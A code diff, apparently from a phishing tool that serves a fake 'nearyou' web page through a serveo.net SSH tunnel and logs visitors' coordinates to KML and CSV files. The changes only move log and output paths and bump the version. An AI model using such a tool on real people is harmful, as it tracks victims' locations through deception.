@@ -26,7 +26,7 @@ result = 'template/nearyou/php/result.txt'
 info = 'template/nearyou/php/info.txt'
 site = 'nearyou'
 row = []
-version = '1.1.4'
+version = '1.1.5'
 
 def banner():
 	os.system('clear')
@@ -77,7 +77,7 @@ def serveo():
 			
 
 	print(G + '[+]' + C + ' Starting PHP Server......' + W, end='')
-	with open('php.log', 'w') as phplog:
+	with open('logs/php.log', 'w') as phplog:
 		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', 'template/'], stdout=phplog, stderr=phplog)
 		time.sleep(2)
 	try:
@@ -93,15 +93,15 @@ def serveo():
 
 	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
 	if subdom is None:
-		with open('serveo.txt', 'w') as tmpfile:
+		with open('logs/serveo.txt', 'w') as tmpfile:
 			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
 	else:
-		with open('serveo.txt', 'w') as tmpfile:
+		with open('logs/serveo.txt', 'w') as tmpfile:
 			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}.serveo.net:80:localhost:8080'.format(subdom), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
 	while True:
 		
 		time.sleep(2)
-		with open('serveo.txt', 'r') as tmpfile:
+		with open('logs/serveo.txt', 'r') as tmpfile:
 			try:
 				stdout = tmpfile.readlines()
 				if flag == False:
@@ -258,7 +258,7 @@ def main():
 	repeat()
 
 def kmlout(var_lat, var_lon):
-	with open('sample.kml', 'r') as kml_sample:
+	with open('template/sample.kml', 'r') as kml_sample:
 		kml_sample_data = kml_sample.read()
 
 	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
@@ -271,7 +271,7 @@ def kmlout(var_lat, var_lon):
 
 def csvout():
 	global row
-	with open('results.csv', 'a') as csvfile:
+	with open('db/results.csv', 'a') as csvfile:
 		writer = csv.writer(csvfile)
 		writer.writerow(row)
 	print(G + '[+]' + C + ' New Entry Added in Database.: ' + W + os.getcwd() + '/results.csv')
